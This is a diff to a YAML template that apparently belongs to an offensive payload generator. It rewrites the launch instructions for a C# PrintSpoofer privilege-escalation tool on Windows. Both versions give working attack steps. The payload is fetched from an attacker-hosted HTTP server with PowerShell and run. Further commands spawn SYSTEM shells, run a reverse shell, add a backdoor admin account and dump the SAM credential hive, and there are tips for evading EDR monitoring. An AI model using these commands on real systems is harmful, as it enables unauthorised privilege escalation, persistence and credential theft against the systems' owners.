@@ -61,27 +61,9 @@ output:
   launch_instructions: |
     C# PrintSpoofer Privilege Escalation - Launch Instructions
 
-    Prerequisites:
-
-    - Windows 10/11 or Server 2016+ target
-    - Print Spooler service must be running (default)
-    - Check: sc query spooler
-
-    Step 1: Transfer Payload to Target
-
-    Transfer the generated executable to the target Windows system:
-
-    Using Python HTTP server:
+    Transfer and Execute:
     python3 -m http.server 8080
-
-    On target (PowerShell):
-    Invoke-WebRequest -Uri "http://YOUR_IP:8080/{{ output_file }}" -OutFile "{{ output_file }}"
-
-    Step 2: Execute PrintSpoofer
-
-    Run with default pipe name and your chosen binary:
-
-    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss {{ binary_path }}
+    On target: powershell -c "IWR -Uri http://YOUR_IP:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss {{ binary_path }}"
 
     Example - Spawn SYSTEM cmd.exe:
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\System32\\cmd.exe
@@ -89,45 +71,37 @@ output:
     Example - Spawn SYSTEM PowerShell:
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
 
-    Example - Execute reverse shell:
+    Example - Execute Reverse Shell:
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\Temp\\reverse.exe
 
-    Step 3: Verify Elevation
-
-    In the spawned process, check privileges:
-    whoami
-    whoami /priv
-    whoami /groups
-
-    Should show: NT AUTHORITY\\SYSTEM
-
-    Notes:
-
-    - Requires Print Spooler service running (enabled by default)
-    - Works from any user privilege level
-    - No UAC bypass needed
-    - Well-known technique, may be detected by EDR
-    - Binary path must be absolute and accessible
-    - Tool waits for Print Spooler connection before spawning process
-
-    Common Use Cases:
-
-    Spawn interactive SYSTEM shell:
-    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss cmd.exe
-
-    Add admin user:
+    Example - Add Admin User:
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
 
-    Dump SAM database:
-    {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss "reg.exe save hklm\\sam C:\\Windows\\Temp\\sam"
+    Verify Elevation:
+    whoami
+    whoami /priv
+    Should show: NT AUTHORITY\SYSTEM
+
+    Notes:
+    - Binary path: {{ binary_path }} (must be absolute and accessible)
+    - Requires Print Spooler service running (enabled by default: `sc query spooler`)
+    - Works from any user privilege level (no UAC bypass needed)
+    - Well-known technique - may be detected by EDR
+    - Tool waits for Print Spooler connection to named pipe before spawning process as SYSTEM
+    - Pipe name: \\\\.\\pipe\\test\\pipe\\spoolss (can be changed if monitored)
+    - Common use: Spawn interactive SYSTEM shell, dump SAM (`reg save hklm\\sam C:\\Temp\\sam`)
 
     Troubleshooting:
-
-    - If Print Spooler not running: sc start spooler
-    - Check service status: sc query spooler
-    - Verify binary path is correct and executable exists
-    - Some EDR products may block this technique
+    - Print Spooler not running: `sc start spooler` (requires admin)
+    - Service start fails: Check `sc query spooler` and Event Viewer
+    - Verify binary path correct and executable exists
+    - EDR may block this well-known technique
     - Try different pipe names if default is monitored
+    - Named pipe creation may trigger Sysmon Event ID 17/18
+
+    Cleanup:
+    On target:
+    del {{ output_file }}
 
     Cleanup:
 
